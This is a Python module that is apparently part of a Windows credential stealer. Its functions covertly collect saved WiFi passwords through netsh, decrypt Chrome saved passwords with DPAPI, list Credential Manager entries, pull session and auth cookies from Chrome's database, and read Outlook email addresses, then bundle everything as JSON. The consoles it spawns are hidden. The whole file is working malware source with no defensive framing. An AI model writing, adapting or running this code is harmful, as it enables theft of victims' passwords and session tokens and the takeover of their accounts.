def execute_credentials():
    """
    Harvest credentials (Windows only)
    
    Collects:
    - System information
    - WiFi passwords
    - Chrome saved passwords
    - Windows Credential Vault
    - Browser cookies/session tokens
    - Email addresses
    """
    
    if platform.system() != "Windows":
        return None, "Credentials harvesting only supported on Windows"
    
    try:
        credentials = {
            "system": get_system_credentials_info(),
            "wifi": get_wifi_passwords(),
            "chrome": get_chrome_passwords(),
            "windows_vault": get_windows_vault_credentials(),
            "browser_cookies": get_browser_cookies(),
            "email_addresses": get_email_addresses(),
            "timestamp": datetime.now().isoformat()
        }
        
        return json.dumps(credentials), None
    except Exception as e:
        return None, str(e)


def get_system_credentials_info():
    """Get system and user account information"""
    try:
        return {
            "hostname": socket.gethostname(),
            "username": os.getlogin() if hasattr(os, 'getlogin') else os.getenv('USER', 'unknown'),
            "domain": os.getenv('USERDOMAIN', 'WORKGROUP'),
            "os": f"{platform.system()} {platform.release()}",
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "user_profile": os.getenv('USERPROFILE', 'unknown'),
            "computername": os.getenv('COMPUTERNAME', 'unknown')
        }
    except:
        return {}


def get_wifi_passwords():
    """Get saved WiFi passwords (Windows)"""
    passwords = []
    
    try:
        # Get list of profiles
        result = subprocess.run(
            ['netsh', 'wlan', 'show', 'profiles'],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == 'Windows' else 0
        )
        
        # Extract profile names
        import re
        profiles = re.findall(r'All User Profile\s+:\s+(.*)', result.stdout)
        
        # Get password for each profile
        for profile in profiles:
            profile = profile.strip()
            result = subprocess.run(
                ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == 'Windows' else 0
            )
            
            # Extract password
            password_match = re.search(r'Key Content\s+:\s+(.*)', result.stdout)
            passwords.append({
                "ssid": profile,
                "password": password_match.group(1) if password_match else "(no password)"
            })
    except:
        pass
    
    return passwords


def get_chrome_passwords():
    """Get Chrome saved passwords"""
    passwords = []
    
    try:
        import sqlite3
        import shutil
        import tempfile
        
        # Chrome login data location
        chrome_path = os.path.join(
            os.getenv('LOCALAPPDATA'),
            r'Google\Chrome\User Data\Default\Login Data'
        )
        
        if not os.path.exists(chrome_path):
            return []
        
        # Copy to temp (file is locked while Chrome is running)
        temp_db = os.path.join(tempfile.gettempdir(), 'chrome_login_temp.db')
        try:
            shutil.copy2(chrome_path, temp_db)
        except:
            return []
        
        # Query database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        try:
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                
                # Decrypt password (Windows DPAPI)
                try:
                    import win32crypt
                    password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
                except:
                    password = "(encrypted)"
                
                if username:
                    passwords.append({
                        "url": url,
                        "username": username,
                        "password": password
                    })
        except:
            pass
        
        conn.close()
        
        # Cleanup
        try:
            os.remove(temp_db)
        except:
            pass
            
    except:
        pass
    
    return passwords


def get_windows_vault_credentials():
    """Get Windows Credential Manager credentials"""
    credentials = []
    
    try:
        # Use cmdkey to list credentials
        result = subprocess.run(
            ['cmdkey', '/list'],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == 'Windows' else 0
        )
        
        import re
        # Parse output
        current_target = None
        for line in result.stdout.split('\n'):
            if 'Target:' in line:
                current_target = line.split('Target:')[1].strip()
            elif 'User:' in line and current_target:
                user = line.split('User:')[1].strip()
                credentials.append({
                    "resource": current_target,
                    "username": user,
                    "password": "(stored in Windows Vault)"
                })
                current_target = None
    except:
        pass
    
    return credentials


def get_browser_cookies():
    """Get browser session cookies/tokens"""
    cookies = []
    
    try:
        import sqlite3
        import tempfile
        import shutil
        
        # Chrome cookies location
        chrome_cookies_path = os.path.join(
            os.getenv('LOCALAPPDATA'),
            r'Google\Chrome\User Data\Default\Network\Cookies'
        )
        
        if os.path.exists(chrome_cookies_path):
            temp_db = os.path.join(tempfile.gettempdir(), 'chrome_cookies_temp.db')
            try:
                shutil.copy2(chrome_cookies_path, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                # Get session tokens (look for auth/session cookies)
                cursor.execute(
                    "SELECT host_key, name, value FROM cookies "
                    "WHERE name LIKE '%session%' OR name LIKE '%token%' OR name LIKE '%auth%' "
                    "LIMIT 50"
                )
                
                for row in cursor.fetchall():
                    host, name, value = row
                    cookies.append({
                        "domain": host,
                        "name": name,
                        "value": value[:50] + "..." if len(value) > 50 else value
                    })
                
                conn.close()
                os.remove(temp_db)
            except:
                pass
    except:
        pass
    
    return cookies


def get_email_addresses():
    """Extract email addresses from various sources"""
    emails = set()
    
    try:
        # From environment variables
        user = os.getenv('USERNAME', '')
        if '@' in user:
            emails.add(user)
        
        # From Outlook registry (if available)
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r'Software\Microsoft\Office\Outlook\OMI Account Manager\Accounts'
            )
            
            i = 0
            while True:
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    subkey = winreg.OpenKey(key, subkey_name)
                    try:
                        email, _ = winreg.QueryValueEx(subkey, 'Email')
                        if email and '@' in email:
                            emails.add(email)
                    except:
                        pass
                    winreg.CloseKey(subkey)
                    i += 1
                except OSError:
                    break
            
            winreg.CloseKey(key)
        except:
            pass
        
    except:
        pass
    
    return list(emails)